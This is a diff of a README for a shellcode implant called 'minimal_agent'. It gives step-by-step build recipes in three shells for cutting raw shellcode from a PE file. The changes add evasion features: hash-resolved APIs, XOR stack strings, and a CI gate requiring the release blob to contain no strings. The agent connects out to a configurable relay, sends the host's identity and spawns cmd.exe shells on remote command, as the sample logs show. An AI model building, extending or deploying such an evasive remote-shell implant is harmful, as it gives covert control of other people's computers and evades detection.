@@ -17,7 +17,9 @@ What makes it interesting is what it does NOT have:
 - **no `.bss`** — nothing static; everything lives on stack frames
   chosen so their lifetime matches what the data needs;
 - **logging is a build option, not a feature** — a release build is
-  silent; a dev build (`-DLOGGING_ENABLED`) talks.
+  silent and contains no log strings at all; a dev build
+  (`-DLOGGING_ENABLED`) speaks printf (`LOG_INFO("Shell %d opened", id)`)
+  through a hand-rolled formatter.
 
 The deliverable shape is a single-`.text` blob (raw shellcode): the
 exe is the same code inside a PE envelope, and `.bin` is that envelope
@@ -58,7 +60,7 @@ Remove-Item -Recurse -Force obj -ErrorAction SilentlyContinue
 New-Item -ItemType Directory -Force obj | Out-Null
 
 # 2) Compile. Sources: entry.c in the root, the rest in src\, headers in include\.
-gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
+gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/logfmt.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
 
 # 3) Park the objects.
 Move-Item *.o obj
@@ -73,14 +75,15 @@ gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident
 rm -rf obj
 mkdir -p obj
 gcc -O2  -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize \
-    -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
+    -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/logfmt.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
 mv *.o obj/
 gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize \
   -nostdlib -T linker.ld -e entry  -o minimal_agent.exe obj/entry.o $(ls obj/*.o | grep -v '/entry.o$')
 ```
 
-One command does all of the above plus the gates:
-`sh .local-tests/build.sh`.
+Every command in this section is what the recipe in
+[Making the shellcode](#making-the-shellcode-agentbin) below spells
+out end to end.
 
 ### Why these exact flags
 
@@ -144,45 +147,96 @@ objdump -h minimal_agent.exe | findstr /C:".text" /C:".rdata" /C:".bss" /C:".pda
 
 ---
 
-## Making the raw blob (agent.bin)
+## Making the shellcode (agent.bin)
+
+The deliverable of this project is the **raw shellcode** — the exe's
+`.text` peeled out of the PE envelope. The exe and the shellcode are
+the same code; because `entry()` is the first byte of `.text`,
+**byte 0 of the file is the entry point**.
+
+The recipe in three shells — pick yours (the `cmd` form is written
+as a `.bat`; in an interactive prompt use `%i` instead of `%%i`):
+
+### agent.bin
+
+PowerShell:
 
 ```powershell
+Remove-Item -Recurse -Force obj -ErrorAction SilentlyContinue
+New-Item -ItemType Directory -Force obj | Out-Null
+
+gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/logfmt.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
+Move-Item *.o obj
+
+gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -nostdlib -T linker.ld -e entry -o minimal_agent.exe ( @(Get-Item obj\entry.o) + (Get-ChildItem obj\*.o -Exclude entry.o) | ForEach-Object FullName )
 objcopy --dump-section .text=agent.bin minimal_agent.exe
 ```
 
-`--dump-section` hands out the section CONTENTS only, under both GNU
-objcopy and llvm-objcopy (`-O binary --only-section=.text` is NOT
-honored the same way by llvm-objcopy — it can emit the whole PE image,
-and the blob then starts with `MZ`).
+cmd (as a `.bat`):
 
-Verify before shipping:
+```bat
+if exist obj rmdir /s /q obj
+mkdir obj
 
-```powershell
-Format-Hex agent.bin | Select-Object -First 1
-# first bytes must be the entry prologue: B8 .. .. 00 00 E8 — not "MZ"
-strings agent.bin          # must print NOTHING (no strings in the blob)
+gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/logfmt.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
+move *.o obj\ >nul
+
+setlocal enabledelayedexpansion
+set OBJS=obj\entry.o
+for %%i in (obj\*.o) do if /i not "%%i"=="obj\entry.o" set OBJS=!OBJS! %%i
+gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -nostdlib -T linker.ld -e entry -o minimal_agent.exe !OBJS!
+endlocal
+
+objcopy --dump-section .text=agent.bin minimal_agent.exe
 ```
 
-Because `entry()` is the first byte of `.text`, **byte 0 of the blob
-is the entry point** — a loader drops the file anywhere in memory
-(RW → copy → RX) and jumps to offset 0.
+bash (MSYS2):
 
-Note: cut the blob from the RELEASE exe. The dev flavor's log format
-strings live in its `.rdata` — a dev blob faults on the first log call
-by design of the logging being stripped in release.
+```sh
+rm -rf obj && mkdir -p obj
+
+gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident \
+    -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize \
+    -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c \
+    src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c \
+    src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/logfmt.c src/memory.c \
+    src/peb.c src/system.c src/djb2.c src/logger.c
+mv *.o obj/
+
+gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident \
+    -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize \
+    -nostdlib -T linker.ld -e entry -o minimal_agent.exe \
+    obj/entry.o $(ls obj/*.o | grep -v '/entry.o$')
+
+objcopy --dump-section .text=agent.bin minimal_agent.exe
+```
+
+`objcopy --dump-section` hands out the section CONTENTS only, under
+both GNU objcopy and llvm-objcopy (`-O binary --only-section=.text`
+is NOT honored the same way by llvm-objcopy — it can emit the whole
+PE image, and the file then starts with `MZ`).
+
+### Verify before shipping
+
+```sh
+head -c 2 agent.bin            # must NOT be "MZ"
+strings -n 12 agent.bin        # must print NOTHING
+```
+
+The strings-empty rule is enforced by a CI gate (`strings -n 12`
+must find nothing in the release shellcode).
 
 ---
 
 ## Run
 
-The relay URL comes from the **`URL` environment variable** (the
+The relay URL comes from the **`W_URL` environment variable** (the
 no-CRT entry point reads it straight from the PEB environment block —
 there is no argv):
 
 ```powershell
-$env:URL = "https://relay.example.com"     # your relay, root path (no /agent)
+$env:W_URL = "https://relay.example.com"   # your relay, root path (no /agent)
 .\minimal_agent.exe                        # release: silent by design
-.\minimal_agent_dev.exe                    # dev: prints every step
 ```
 
 The URL is the relay ROOT — the deployed relay generation accepts the
@@ -209,39 +263,45 @@ to the relay, and `winhttp.dll` appears in its module list.
 
 ### Dev flavor (to see what it does)
 
-Same two steps as the release build with `-DLOGGING_ENABLED` added to
-BOTH the compile and the link line (miss one and you get a silent
-hybrid), a cleaned `obj\` (mixing release objects in produces a
-broken hybrid too), and a distinct output name:
+Same two steps as the release build with `-DLOGGING_ENABLED`
+added to BOTH the compile and the link line (miss one and you get a
+silent hybrid), a cleaned `obj\` (mixing release objects in produces
+a broken hybrid too), **`src/logfmt.c` in the source list** (the
+printf formatter — compiles empty in release), and a distinct output
+name:
 
 ```powershell
 # Clean before compiling the debug objects.
 Remove-Item -Recurse -Force obj -ErrorAction SilentlyContinue
 New-Item -ItemType Directory -Force obj | Out-Null
 
-gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -DLOGGING_ENABLED -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
+gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -DLOGGING_ENABLED -c entry.c src/stack_probes.c src/main.c src/identity_headers.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/logfmt.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
 Move-Item *.o obj
 
 gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -DLOGGING_ENABLED -nostdlib -T linker.ld -e entry -o minimal_agent_dev.exe ( @(Get-Item obj\entry.o) + (Get-ChildItem obj\*.o -Exclude entry.o) | ForEach-Object FullName )
 
-$env:URL = "https://relay.example.com"
+$env:W_URL = "https://relay.example.com"
 .\minimal_agent_dev.exe
 ```
 
-It prints:
+It prints (one line per step, values included):
 
 ```
-[INF] Connecting to https://relay.example.com ...
-[INF] Identity: 356 header bytes on the upgrade request
-
+[INF] Connecting to relay ...
+[INF] Identity headers prepared: 356 byte(s)
 [INF] Connected (HTTP 101 Switching Protocols)
-
-[INF] [2] Agent mode: replying to commands (capability mask = Shell)...
-
+[INF] Agent mode: replying to commands (capability mask = Shell)
+[INF] recv OpenShell corr=14 len=1
+[INF] Shell 0 opened (cmd.exe spawned)
+[INF] recv WriteShell corr=15 len=17
+[INF] Write to shell 0: 4 byte(s)
+[INF] recv ReadShell corr=16 len=9
+[INF] Read shell 0 - 174 byte(s)
 ```
 
-and one line per panel command as they arrive (`Shell 0 opened`,
-`Write to shell 0`, `Read shell 0 - N byte(s)`, `Exit requested`).
+and `[ERR]` lines with the WinHTTP error code when something fails
+(`WinHttpSendRequest failed (GLE=12029)`), plus the redial backoff
+(`connection lost - redialing in 2 s`).
 
 ### What it does on the wire
 
@@ -279,11 +339,13 @@ browser works with zero file opcodes implemented.
 | `wire.h` | tiny little-endian writers (header-only) |
 | `transport.h/.c` | the WebSocket pipe: one reply out (`ws_send`), one assembled message in (`ws_receive`) |
 | `shell.h/.c` | the cmd.exe pool: spawn / write / drain / teardown, 256 slots |
-| `report.h/.c` | terminal diagnostics — every name is a stack string |
+| `report.h/.c` | dev-only diagnostics: opcode/buffer-type names (compiled out in release) |
+| `logger.h/.c` | the two-flavor logging: printf macros over a stack buffer; release compiles to nothing |
+| `logfmt.c` | the printf formatter (`Format`/`FormatV`, bounded) — dev-only, empty TU in release |
 | `system_facts.h/.c` | hostname, username, OS version (the identity payload) |
 | `winhttp_api.h/.c` | the WinHTTP table + the LdrLoadDll bootstrap that maps winhttp.dll |
 | `kernel32/ntdll/advapi.h/.c` | one function table per DLL, hash-resolved |
-| `peb.h/.c` | TEB/PEB access, the loader module-list walk, environment reader |
+| `peb.h/.c` | TEB/PEB access, the module-list walk, environment reader |
 | `system.h/.c` | export-table resolve — by name (tooling) and by hash (the agent) |
 | `apihash.h` | the precomputed djb2 constants for every name used |
 | `stackstrings.h` | every runtime string, built on the stack, XOR-decoded in the write |
@@ -304,10 +366,11 @@ Cross-builds the three Windows architectures with
 aarch64) and bakes the identity metadata (`-DID_BUILD_NUMBER`,
 `-DAGENT_COMMIT_HASH`):
 
-- **build.yml** — on push/PR: builds all three arches and runs four
-  gates (empty imports; entry at `.text` byte 0; blob not starting
-  with `MZ`; no rip-relative reference leaving `.text`). On pushes to
-  main it also republishes the rolling `preview` pre-release;
+- **build.yml** — on push/PR: builds all three arches and runs the
+  gates (empty imports; entry at `.text` byte 0; the `.bin` not
+  starting with `MZ`; no separate data sections; **`.bin`
+  strings-empty**). On pushes to main it also republishes the rolling
+  `preview` pre-release;
 - **release.yml** — on a `v*` tag: the same gated binaries as a stable
   GitHub Release (`windows-{i386,x86_64,aarch64}.{exe,bin}`).
 
